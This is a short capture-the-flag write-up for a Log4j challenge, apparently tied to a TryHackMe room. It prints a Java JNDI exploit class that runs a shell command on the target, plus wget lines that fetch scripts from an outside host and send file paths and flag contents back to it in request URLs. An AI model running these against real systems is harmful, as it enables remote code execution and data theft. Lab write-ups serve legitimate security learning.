# Log for Jodie

>Test for Log4j Exploit

![](https://i.imgur.com/eiIaalI.png)

> Just follow this until you get stuck
> https://tryhackme.com/room/solar

> When you follow tryhackme, the exploit will have errors:

> Use this instead:
> https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/blob/master/HackerServer/src/main/java/Exploit.java

> If you scroll down in the tryhackme exploitation section, you will see this
> javac Exploit.java -source 8 -target 8
> One of the error you might face when using the exploit is the version of openjdk that is use to compile the .java file
> Just use your java-8-openjdk javac to compile
> /usr/lib/jvm/java-8-openjdk/bin/javac Exploit.java

> Bash doesn't work, so I assume there is probably no bash on the system

```
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.*;
import java.util.Hashtable;

public class Exploit implements ObjectFactory {

    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        try {
            Runtime.getRuntime().exec("sh test.sh");
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
}
```

## My (not so elegant) solution
```wget http://a.b.c.d/flag.sh```

```
#flag.sh

for f in $(find / -name 'flag*'); do
  wget http://a.b.c.d/$f
done
```

```sh flag.sh```

```wget http://a.b.c.d/flag1.sh```

```
#flag1.sh
wget http://a.b.c.d/`cat ./task/flag.txt`
```

```sh flag1.sh```

![](https://i.imgur.com/XFLrZgV.png)

![](https://i.imgur.com/NaoCsFN.png)

> Flag at /task/flag.txt
